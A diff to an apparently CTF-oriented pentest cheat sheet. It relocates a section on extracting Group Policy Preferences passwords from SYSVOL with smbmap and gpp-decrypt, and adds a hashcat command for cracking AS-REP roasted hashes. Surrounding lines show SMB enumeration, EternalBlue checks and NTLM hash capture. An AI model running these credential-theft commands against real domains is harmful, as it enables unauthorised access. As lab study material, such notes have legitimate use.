@@ -328,6 +328,20 @@ FTP commands:
 5. With credentials: `crackmapexec smb <IP> -u user -p pass --shares`
 6. Check EternalBlue: `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010`
 
+#### Abusing GPP Passwords
+
+If you are in a domain controlled and you're allowed to see the content of the SYSVOL resource or a similar structure you can found credentials inside. The path normally is this:
+
+```bash
+smbmap -H 10.10.10.10 -r Policies/{31B...-5661...-725}/MACHINE/Preferences/Groups/Groups.xml
+```
+
+To crack the hash you can use `gpp-decrypt` tool (Microsoft shared the AES-key).
+
+```bash
+gpp-decrypt <cpassword_value>
+```
+
 ### RPC (port 445)
 
 1. Attempt anonymous connection: `rpcclient -U "" <IP> -N`
@@ -573,6 +587,12 @@ You can do either if you have valid credentials, just in case you lose some user
 ```bash
 impacket-GetNPUsers domain.htb/user:password -no-pass -usersfile users.txt -dc-ip <IP> 
 ```
+
+To crack:
+```
+hashcat -m 18200 -a 0 file.hash --wordlist rockyou.txt 
+```
+
 
 asreproasting attack:
 ```
@@ -927,22 +947,6 @@ responder -I tun0 -v
 If any person open the folder where is the file, only with open the folder you obtain the hash NTLM
 
 There are a tool called [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) that generate and test different files to see what is valid.
-
----
-
-## Abusing GPP Passwords
-
-If you are in a domain controlled and you're allowed to see the content of the SYSVOL resource or a similar structure you can found credentials inside. The path normally is this:
-
-```bash
-smbmap -H 10.10.10.10 -r Policies/{31B...-5661...-725}/MACHINE/Preferences/Groups/Groups.xml
-```
-
-To crack the hash you can use `gpp-decrypt` tool (Microsoft shared the AES-key).
-
-```bash
-gpp-decrypt <cpassword_value>
-```
 
 ---
 
